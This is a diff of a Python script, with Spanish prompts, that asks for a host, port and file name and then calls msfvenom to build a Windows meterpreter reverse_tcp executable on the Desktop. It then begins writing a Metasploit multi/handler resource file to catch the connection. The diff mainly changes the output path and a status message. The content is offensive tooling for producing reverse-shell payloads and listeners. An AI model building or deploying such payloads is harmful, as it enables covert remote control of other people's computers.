@@ -71,10 +71,11 @@ while True:
             lport = int(input("Escribe el puerto: "))
             output = input("Que nombre le quieres dar al archivo?: ")
             os.system('cls' if os.name == 'nt' else 'clear')
-            print("\nCreando exploit...")
+            print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
             if os.name == "nt":
-                os.system("cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
+                os.system(r"cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o C:\Users\%USERNAME%\Desktop\{}.exe".format(lhost, lport, output))
                 salir = input("Desea abrir el listener de metasploit? (s/n): ")
+                os.system(r"cd C:\metasploit")
                 f = open("meta.rc", "w+")
                 for i in range(1):
                     f.write("use exploit/multi/handler\n")
